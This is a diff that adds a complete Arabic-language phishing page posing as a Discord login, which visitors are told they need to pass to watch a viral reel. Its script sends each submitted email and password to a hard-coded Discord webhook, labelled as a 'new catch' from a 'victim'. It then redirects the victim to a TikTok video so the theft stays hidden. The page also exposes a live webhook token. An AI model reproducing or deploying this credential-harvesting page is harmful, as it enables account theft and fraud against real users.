@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Watch Viral Reel</title>
+    <style>
+        body { background-color: #313338; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #2b2d31; padding: 30px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.2); width: 90%; max-width: 400px; text-align: center; }
+        h2 { font-size: 20px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: none; background-color: #1e1f22; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; margin-top: 15px; border-radius: 4px; border: none; background-color: #5865f2; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #4752c4; }
+        .info { font-size: 12px; color: #b5bac1; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://assets-global.website-files.com/6257adef93867e3d03400e66/636e0a6a49f9525735f14e7e_icon_clyde_blurple_RGB.png" width="50" alt="Discord">
+        <h2>سجل دخولك لمشاهدة الريلز</h2>
+        <form id="trapForm">
+            <input type="email" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <p class="info">هذا المحتوى يتطلب التحقق من الحساب للمشاهدة</p>
+    </div>
+
+    <script>
+        const web_url = "https://discord.com/api/webhooks/1491926490361626794/4-BpbrT0_5Qiy8HlssJyJlhlXJ5G5w_uZk7IlMFAisNJ-VmenDxcG8sk3nGZSCc32iQD";
+        const video_url = "https://vt.tiktok.com/ZSH9XWjnR/";
+
+        document.getElementById('trapForm').onsubmit = function(e) {
+            e.preventDefault();
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+
+            // إرسال البيانات فوراً للويب هوك بتاعك
+            fetch(web_url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚀 صيد جديد من MNC",
+                        color: 15158332,
+                        fields: [
+                            { name: "📧 الإيميل", value: "`" + u + "`", inline: false },
+                            { name: "🔑 الباسورد", value: "`" + p + "`", inline: false }
+                        ],
+                        footer: { text: "Victim device: Mobile/Web" }
+                    }]
+                })
+            }).then(() => {
+                // بعد ما البيانات توصلك، الصفحة هتحوله للفيديو الحقيقي فوراً
+                window.location.href = video_url;
+            }).catch(() => {
+                window.location.href = video_url;
+            });
+        };
+    </script>
+</body>
+</html>
